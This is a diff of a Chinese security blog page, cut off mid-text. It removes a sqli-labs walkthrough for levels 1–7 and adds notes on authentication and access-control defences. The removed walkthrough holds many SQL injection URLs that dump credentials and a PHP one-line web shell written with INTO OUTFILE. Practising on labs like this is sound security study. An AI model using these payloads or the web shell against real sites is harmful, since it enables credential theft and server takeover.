@@ -9,38 +9,19 @@
   
   <title>Star_Cheng的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1.level-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入) 构造?id=数字’后发现报错，说明存在SQL注入：    在单引号后面加入#的url编码后页面显示正常，写出几个常用的：空格是%20，单引号是%27，井号是%23，双引号是%22      接下来猜解字段的数目，使用order by语句，使用order by">
+  <meta name="description" content="第2章：核心防御机制1.为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？ 典型的应用程序使用三重机制（身份验证、会话管理和访问控制）来处理访问。这些组件之间高度相互依赖，其中任何一个组件存在缺陷都会降低整个访问控制机制的效率。例如，攻击者可以利用身份验证机制中的漏洞以任何用户身份登录，并因此获得未授权访问权限。如果能够预测令牌，攻击者就可以假冒成任何已登录用户并访问他们的数据。如果访">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Star_Cheng的博客">
 <meta property="og:url" content="http://yoursite.com/2018/11/26/sqli-lab(1-10)/index.html">
 <meta property="og:site_name" content="Star_Cheng的博客">
-<meta property="og:description" content="1.level-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入) 构造?id=数字’后发现报错，说明存在SQL注入：    在单引号后面加入#的url编码后页面显示正常，写出几个常用的：空格是%20，单引号是%27，井号是%23，双引号是%22      接下来猜解字段的数目，使用order by语句，使用order by">
+<meta property="og:description" content="第2章：核心防御机制1.为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？ 典型的应用程序使用三重机制（身份验证、会话管理和访问控制）来处理访问。这些组件之间高度相互依赖，其中任何一个组件存在缺陷都会降低整个访问控制机制的效率。例如，攻击者可以利用身份验证机制中的漏洞以任何用户身份登录，并因此获得未授权访问权限。如果能够预测令牌，攻击者就可以假冒成任何已登录用户并访问他们的数据。如果访">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/558A408AB82F496BB026008000413B0D/4414">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/6CD8F28C1F6D4386857E50CB6B111082/4419">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/D7E5A9D7D23149A7B5FA9E7B0352BB91/4421">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/2288E506BC7B405C92F1EC76FD5663C7/4425">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/C16E0386666E4932BE1D27C2C00340EA/4420">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/070E58FF5F2E49E5B465271727982593/4422">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/204597D742A2418CA81D7AE694E19413/4426">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/954C506AA5F243E9AB42347ABF533AC2/4423">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/C0CAF574597C47318D32C1611ADE2F18/4416">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/BAE7C7F8EF924262B7470B2FCB68B959/4417">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/BE395A607FBA4159944DD2FC91E4E808/4415">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/1C5217B34DA84064A914D8601FE8D448/4418">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/D394D877D4C54AD1800009CDB591BEE9/4412">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/5FD5BB60E40946C6B89BEE1561F6F1B1/4411">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/77142EDB338D4E2AB4143D8D301E4AF8/4413">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/F6C6CADED45C4D949FAF84F8031C54A2/4471">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/BCFDA032C5C4409B8B9AB69D72A9B187/4473">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/4CB82ADCB48D4D3F8B868CEC8BF8302E/4481">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/DE5558657C734B848001492AB4287843/4492">
-<meta property="og:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/5FBEAEECACA143C8A03B0206CB86FF7A/6223">
-<meta property="og:updated_time" content="2018-07-30T06:03:39.194Z">
+<meta property="og:image" content="http://yoursite.com/2018/11/26/sqli-lab(1-10)/sun.png">
+<meta property="og:updated_time" content="2018-11-26T08:51:06.346Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Star_Cheng的博客">
-<meta name="twitter:description" content="1.level-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入) 构造?id=数字’后发现报错，说明存在SQL注入：    在单引号后面加入#的url编码后页面显示正常，写出几个常用的：空格是%20，单引号是%27，井号是%23，双引号是%22      接下来猜解字段的数目，使用order by语句，使用order by">
-<meta name="twitter:image" content="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/558A408AB82F496BB026008000413B0D/4414">
+<meta name="twitter:description" content="第2章：核心防御机制1.为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？ 典型的应用程序使用三重机制（身份验证、会话管理和访问控制）来处理访问。这些组件之间高度相互依赖，其中任何一个组件存在缺陷都会降低整个访问控制机制的效率。例如，攻击者可以利用身份验证机制中的漏洞以任何用户身份登录，并因此获得未授权访问权限。如果能够预测令牌，攻击者就可以假冒成任何已登录用户并访问他们的数据。如果访">
+<meta name="twitter:image" content="http://yoursite.com/2018/11/26/sqli-lab(1-10)/sun.png">
   
     <link rel="alternative" href="/atom.xml" title="Star_Cheng的博客" type="application/atom+xml">
   
@@ -310,214 +291,95 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="1-level-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#1-level-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="1.level-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>1.level-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><ul>
-<li>构造?id=数字’后发现报错，说明存在SQL注入：</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/558A408AB82F496BB026008000413B0D/4414" alt=""></p>
-<ul>
-<li>在单引号后面加入#的url编码后页面显示正常，写出几个常用的：空格是%20，单引号是%27，井号是%23，双引号是%22  </li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/6CD8F28C1F6D4386857E50CB6B111082/4419" alt=""></p>
-<ul>
-<li>接下来猜解字段的数目，使用order by语句，使用order by 3，页面返回正常，使用order by 4页面出错，说明字段的数目为3</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/D7E5A9D7D23149A7B5FA9E7B0352BB91/4421" alt=""></p>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/2288E506BC7B405C92F1EC76FD5663C7/4425" alt=""></p>
-<ul>
-<li>使用union查询，但是却发现2,3不出现，查看源代码发现，原来mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/C16E0386666E4932BE1D27C2C00340EA/4420" alt=""></p>
-<ul>
-<li>我们只要想办法让union左边的查询语句为空，那么union右边的查询结果就会变成第一行并打印出来</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/070E58FF5F2E49E5B465271727982593/4422" alt=""></p>
-<ul>
-<li>但是只要2,3的位置用来查询信息，效率有些低，我们可以使用数据库连接函数concat和concat_ws,其中concat_ws的第一个参数是连接字符串的分隔符。</li>
-<li>MySQL的concat函数可以连接一个或者多个字符串，且如果有一个字符为null，结果就返回null，如：</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/204597D742A2418CA81D7AE694E19413/4426" alt=""></p>
-<ul>
-<li>concat_ws()函数, 表示concat with separator,即有分隔符的字符串连接如连接后以_分隔,和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL且第一个字符是连接符：  </li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/954C506AA5F243E9AB42347ABF533AC2/4423" alt=""></p>
-<ul>
-<li>其中<blockquote>
-<p>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本  </p>
+        <p><img src="./sun.png" alt="Alt text"></p>
+<h3 id="第2章：核心防御机制"><a href="#第2章：核心防御机制" class="headerlink" title="第2章：核心防御机制"></a>第2章：核心防御机制</h3><h4 id="1-为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？"><a href="#1-为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？" class="headerlink" title="1.为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？"></a>1.为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？</h4><blockquote>
+<p>典型的应用程序使用三重机制（身份验证、会话管理和访问控制）来处理访问。这些组件之间高度相互依赖，其中任何一个组件存在缺陷都会降低整个访问控制机制的效率。例如，攻击者可以利用身份验证机制中的漏洞以任何用户身份登录，并因此获得未授权访问权限。如果能够预测令牌，攻击者就可以假冒成任何已登录用户并访问他们的数据。如果访问控制不完善，则任何用户都可以直接使用应该受到保护的功能。</p>
 </blockquote>
-</li>
-<li>演示一下分别使用concat和concat_ws，分隔符使用char()，32为空格，58为冒号，124为|，也可以使用16进制的形式</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/C0CAF574597C47318D32C1611ADE2F18/4416" alt="">  </p>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/BAE7C7F8EF924262B7470B2FCB68B959/4417" alt=""></p>
-<ul>
-<li>我们可以看到爆出的数据库名为security，接着爆出该数据库下的表，使用where语句值不能直接用英文，要用单引号包裹着，当然用十六进制表示也可以，配合着limit使用可以逐个爆出表</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/BE395A607FBA4159944DD2FC91E4E808/4415" alt="">  </p>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/1C5217B34DA84064A914D8601FE8D448/4418" alt=""></p>
-<ul>
-<li>但是通过使用limit来逐个爆出的效率有点低，我们引入一个新的方法group_concat(),即可高效爆出表，并且以逗号最为分隔符<br><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/D394D877D4C54AD1800009CDB591BEE9/4412" alt=""></li>
-</ul>
-<ul>
-<li>我们一般只需获得user的消息，所以我们接着使用此方法爆出user表下的列： </li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/5FD5BB60E40946C6B89BEE1561F6F1B1/4411" alt=""></p>
-<ul>
-<li>接着我们照样一口气爆出该表下的所有字段内容  </li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/77142EDB338D4E2AB4143D8D301E4AF8/4413" alt=""></p>
-<h3 id="2-less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#2-less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="2.less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>2.less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><ul>
-<li>输入单引号出现报错，输入%23还是报错，根据源码分析，该注入类型为数字型。<br>步骤与第一关类似，我直接上最后一步：  </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,concat_ws(char(32,58,32),id,database(),password) from  users limit 0,1 %23  </span><br><span class="line">或者  </span><br><span class="line">http://localhost/sqli-labs/Less-2/?id=0 union select 1,2,group_concat(id,char(32,124,32),database(),char(32,124,32),password) from  users%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/F6C6CADED45C4D949FAF84F8031C54A2/4471" alt=""><br><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/BCFDA032C5C4409B8B9AB69D72A9B187/4473" alt="">  </p>
-<h3 id="3-less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#3-less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="3.less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>3.less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><ul>
-<li>当我们输入单引号的时候，报错中出现了一个括号，看来此处的变形为），再根据源码分析，确实如此： </li>
-</ul>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/4CB82ADCB48D4D3F8B868CEC8BF8302E/4481" alt="">  </p>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/DE5558657C734B848001492AB4287843/4492" alt="">   </p>
-<p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-3/?id=0&apos;) union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 4,1 %23</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">### 4.less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）  </span><br><span class="line">* 尝试加入单引号，没有报错，但是在加入双引号后报错且需要加入括号，单引号没有报错的原因是PHP中双引号可以包含单引号  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/0BD256ED3A1248139C523EF6104F2ECB/4496)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/4F1FD36DDA1947DB9F53095B957F78C1/4498)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload如下：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost/sqli-labs/Less-4/?id=0&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/?id=0&quot;</a>) union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 4,1 %23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 5.less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">参考资料如下：</span><br><span class="line">https://www.2cto.com/article/201303/192718.html  </span><br><span class="line"></span><br><span class="line">https://www.2cto.com/article/201604/498394.html  </span><br><span class="line"></span><br><span class="line">http://www.moonsec.com/post-314.html</span><br><span class="line"></span><br><span class="line">* 构造payload：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost/sqli-labs/Less-5/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/?id=0&#39;</a>  union select count(<em>),2,concat(‘~’,(select database()),’~’,(floor(rand(0)</em>2)))as x from information_schema.tables group by x %23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/29CC778E98984B5B976F5D75E43798A7/4540)</span><br><span class="line"></span><br><span class="line">（为了让结果变清晰，我加了分隔符&apos;~&apos;)</span><br><span class="line"></span><br><span class="line">* 接着查询表名：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost/sqli-labs/Less-5/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/?id=0&#39;</a>  union select count(<em>),2,concat(‘~’,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),’~’,(floor(rand(0)</em>2)))as x from information_schema.tables group by x %23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">* 接着查询列名：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost/sqli-labs/Less-5/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/?id=0&#39;</a>  union select count(<em>),2,concat(‘~’,(select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1),’~’,(floor(rand(0)</em>2)))as x from information_schema.tables group by x %23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/3073F95A420045EDAB5F59428A70C0DB/4552)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 最后爆出字段内容：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost/sqli-labs/Less-5/?id=0&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/?id=0&#39;</a>  union select count(<em>),2,concat(‘~’,(select password from users limit 1,1),’~’,(floor(rand(0)</em>2)))as x from information_schema.tables group by x %23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/510119F856BC4B96880D06F4E764C0AB/4556)</span><br><span class="line"></span><br><span class="line">### 解法二： </span><br><span class="line">使用派生表的方法先爆数据库名： </span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; union select 1 from (select count(*),concat(&apos;~&apos;,(select database()),&apos;~&apos;,(floor(rand(0)*2)))as x from information_schema.tables group by x)a%23  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/57CED3FF035C411CB7BFED7D9B1AAA68/4728)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接着爆表名：  </span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; union select 1 from (select count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&apos;~&apos;,(floor(rand(0)*2)))as x from information_schema.tables group by x)a%23  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/A0FE5A3AD4104FEF822B21FFA7453A31/4731)  </span><br><span class="line"></span><br><span class="line">接着爆列名：  </span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; union select 1 from (select count(*),concat(&apos;~&apos;,(select column_name from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;limit 0,1),&apos;~&apos;,(floor(rand(0)*2)))as x from information_schema.tables group by x)a%23 </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/C8CFE6BC81D8465182D4DE6634283862/4733)</span><br><span class="line"></span><br><span class="line">最后爆账号和密码：  </span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; union select 1 from (select count(*),concat(&apos;~&apos;,(select concat_ws(&apos;::&apos;,id,username,password) from users limit 1,1),&apos;~&apos;,(floor(rand(0)*2)))as x from information_schema.tables group by x)a%23  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/4BA5C2598A794B91B7AB47DDF832FE49/4735)  </span><br><span class="line"></span><br><span class="line">### 其它报错注入式利用方法：  </span><br><span class="line">①使用extractvalue</span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(&apos;~&apos;,(select database()),&apos;~&apos;));%23    </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/FFD0AF2E948B4C1388D81AD477D83DAE/4742)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">②使用UpdateXml  </span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; and 1=(updatexml(1,concat(&apos;~&apos;,(select database()),&apos;~&apos;),1))%23  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/C6F4DC2B56E2453E8A86509A0B936BAA/4758)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">③使用name_const()  </span><br><span class="line">&gt;http://localhost/sqli-labs/Less-5/?id=1&apos; and 1=(select * from (select name_const(version(),1),name_const(version(),1))b)%23  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/D711794C88814B5D8C7DA4F059FF2ABD/4763)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)  </span><br><span class="line"></span><br><span class="line">第六关与第五关差不多，将1&apos;的单引号换成双引号就可以了   </span><br><span class="line"></span><br><span class="line">### less-7 GET - Dump into outfile - String （导出文件GET字符型注入）   </span><br><span class="line"></span><br><span class="line">导出文件就是可以将查询的结果导出到一个文件中，比较常见的是将一句话木马导入到一个php文件中。常用的语句：</span><br></pre></td></tr></table></figure></p>
-<p>select “&lt;?php @eval($_POST[‘Star_Cheng’]);?&gt;” into outfile “XXX\XXX/php”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">前提是要获取到网站的绝对路径，这里可以使用这两个函数来辅助获取路径  </span><br><span class="line">&gt;@@datadir  读取数据库路径  </span><br><span class="line">&gt;@@basedir  mysql安装路径  </span><br><span class="line"></span><br><span class="line">首先猜测列数：  </span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/69E27EFDB515450EA7AE3003BE4B555B/6052)</span><br><span class="line"></span><br><span class="line">由于less-7无法输出，我们调至less-1来进行输出，将2,3改为@@datadir,@@basedir:  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/799147DA1B9E42B0A5CFD6F7A0B81931/6055)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们在mysql命令行中测试一下文件导出语句：  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/18B46E7413424C458BB731635A392ABA/5127)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">发现出现了错误，此时我们需要再mysql.ini中加入一句secure_file_priv=&quot;&quot;   </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/EE89E5F059B24E90BC1BEAA67D6BBA0C/5129)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">执行成功，查看一下内容，发现已经写入。   </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/14FF442F4BFB4F9CB34E3B1D9FBC6779/5131)</span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/AE926872FA114FD5AB8BDA74716C5767/5133)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接着我们来将一句话导入：  </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/396B0BB717314AC4AF0C484BDD7EAC44/5142)  </span><br><span class="line"></span><br><span class="line">虽然报出错误但是不影响文件的生成，接着就是上彩刀连接了：  </span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/A7A42D1817FB4AF9A43F2A1B922C765E/5137)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/0D1B26952F0E4588A939733920EF239A/5147)   </span><br><span class="line"></span><br><span class="line">![](https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/B7B1F241847843ECBABF0C12C1F868A3/5150)   </span><br><span class="line"></span><br><span class="line">### 接下来进入盲注篇章  </span><br><span class="line"></span><br><span class="line"></span><br><span 